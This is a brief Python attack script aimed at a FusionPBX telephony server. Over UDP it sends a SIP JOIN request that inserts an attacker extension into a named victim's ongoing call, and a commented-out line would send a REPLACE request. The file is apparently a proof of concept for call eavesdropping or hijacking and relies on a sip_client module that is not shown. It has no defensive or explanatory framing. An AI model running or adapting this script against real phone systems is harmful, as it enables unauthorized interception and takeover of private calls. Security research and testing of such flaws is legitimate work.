import socket

from argparse import ArgumentParser
from sip_client import SipClient

parser = ArgumentParser()
parser.add_argument("--attacker_address", type=str)
parser.add_argument("--fusion_pbx_address", type=str)
parser.add_argument("--victim_number", type=str)
parser.add_argument("--dialog_identifier", type=str)
args = parser.parse_args()

attacker_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
client_address = args.attacker_address
attacker_port = 52011
attacker_socket.bind((client_address, attacker_port))
sip_host = args.fusion_pbx_address
attacker_socket.connect((sip_host, 5060))
attacker_number = 1003
attacker_client = SipClient(sip_host, client_address, attacker_number, attacker_port)

# attacker_socket.send(bytes(attacker_client.replace_message(1002).encode('utf-8')))
attacker_socket.send(
    bytes(
        attacker_client.join_message(
            args.victim_number,
            args.dialog_identifier
            ).encode('utf-8')))
attacker_socket.recv(8192)
